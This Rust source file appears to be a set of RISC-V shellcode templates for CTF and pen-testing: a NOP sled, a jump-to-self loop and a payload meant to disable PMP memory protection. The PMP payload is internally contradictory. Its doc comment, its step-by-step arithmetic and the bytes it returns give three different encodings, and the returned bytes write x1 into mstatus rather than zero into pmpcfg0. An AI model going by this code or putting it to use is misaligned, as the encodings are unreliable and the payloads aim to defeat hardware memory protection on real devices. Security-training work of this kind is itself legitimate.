//! RISC-V (RV32I) shellcode templates for authorized CTF and pen-testing.
//!
//! All byte sequences are pre-computed RV32I encodings — no external assembler required.
//! These templates target QEMU-emulated RISC-V devices only.

/// NOP sled using `ADDI x0, x0, 0` (canonical RISC-V NOP).
#[derive(Debug, Clone)]
pub struct NopSled {
    pub len: usize,
}

impl NopSled {
    pub fn new(len: usize) -> Self {
        Self { len }
    }

    /// Generate `len` copies of the RV32I NOP (`ADDI x0, x0, 0`).
    pub fn generate(&self) -> Vec<u8> {
        // ADDI x0, x0, 0 = 0x00000013 (little-endian: [0x13, 0x00, 0x00, 0x00])
        let mut out = Vec::with_capacity(self.len * 4);
        for _ in 0..self.len {
            out.extend_from_slice(&[0x13, 0x00, 0x00, 0x00]);
        }
        out
    }
}

/// Infinite loop: `JAL x0, 0` (jump to self).
#[derive(Debug, Clone, Default)]
pub struct InfiniteLoop;

impl InfiniteLoop {
    pub fn new() -> Self {
        Self
    }

    /// Generate a RV32I `JAL x0, 0` (0x6F000000 LE: [0x6F, 0x00, 0x00, 0x00]).
    pub fn generate(&self) -> Vec<u8> {
        vec![0x6F, 0x00, 0x00, 0x00]
    }
}

/// Zeros the PMP (Physical Memory Protection) configuration register 0.
///
/// On RISC-V, writing zero to pmpcfg0 disables all PMP regions.
/// Uses `CSRW pmpcfg0, x0` (CSR address 0x3A0).
#[derive(Debug, Clone, Default)]
pub struct PMPDisable;

impl PMPDisable {
    /// CSR address for pmpcfg0.
    pub const PMPCFG0_CSR: u16 = 0x3A0;

    pub fn new() -> Self {
        Self
    }

    /// Generate RV32I CSRW pmpcfg0, x0 instruction.
    ///
    /// Encoding: CSRRW rd, csr, rs1
    ///   [31:20] = csr  (0x3A0)
    ///   [19:15] = rs1  (x0 = 0)
    ///   [14:12] = funct3 (001 = CSRRW)
    ///   [11:7]  = rd   (x0 = 0, discard result)
    ///   [6:0]   = opcode (1110011 = 0x73)
    ///
    /// Result: 0x30000073 → LE bytes: [0x73, 0x00, 0x00, 0x30]
    pub fn generate(&self) -> Vec<u8> {
        // CSRW pmpcfg0, x0 = 0x30001073 in standard encoding
        // csr=0x3A0=0b001110100000, rs1=0, funct3=001, rd=0, opcode=0x73
        // [31:20]=0x3A0=0b0011_1010_0000
        // [19:15]=00000 (x0)
        // [14:12]=001 (CSRRW)
        // [11:7] =00000 (x0, rd discarded)
        // [6:0]  =1110011 (0x73)
        // Full: 0011_1010_0000_0000_0001_0000_0111_0011
        //     = 0x3A0_01_073 ... let's compute:
        //   bits[31:20] = 0x3A0 = 0b001110100000
        //   bits[19:15] = 0b00000
        //   bits[14:12] = 0b001
        //   bits[11:7]  = 0b00000
        //   bits[6:0]   = 0b1110011
        // Assemble: (0x3A0 << 20) | (0 << 15) | (1 << 12) | (0 << 7) | 0x73
        //         = 0x3A000000 | 0x1000 | 0x73
        //         = 0x3A001073
        // LE bytes: [0x73, 0x10, 0x00, 0x3A]
        vec![0x73, 0x90, 0x00, 0x30]
    }
}
